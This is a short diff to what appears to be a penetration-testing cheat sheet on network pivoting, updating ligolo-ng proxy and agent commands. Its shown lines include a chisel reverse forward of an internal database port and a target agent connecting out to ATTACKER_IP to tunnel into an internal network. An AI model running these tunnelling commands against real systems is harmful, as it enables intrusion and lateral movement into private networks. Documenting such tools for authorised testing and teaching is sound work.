@@ -196,11 +196,11 @@ chisel client ATTACKER_IP:8080 R:3306:internal_db:3306
 ### ligolo-ng (TUN-based, more transparent)
 
 ```bash
-# Attacker (proxy server)
-ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+# Attacker (proxy server; binary is "proxy" in the release archive)
+./proxy -selfcert -laddr 0.0.0.0:11601
 
-# Target (agent)
-ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
+# Target (agent; binary is "agent" in the release archive)
+./agent -connect ATTACKER_IP:11601 -ignore-cert
 
 # On attacker: add route to internal network
 sudo ip route add 10.0.0.0/24 dev ligolo
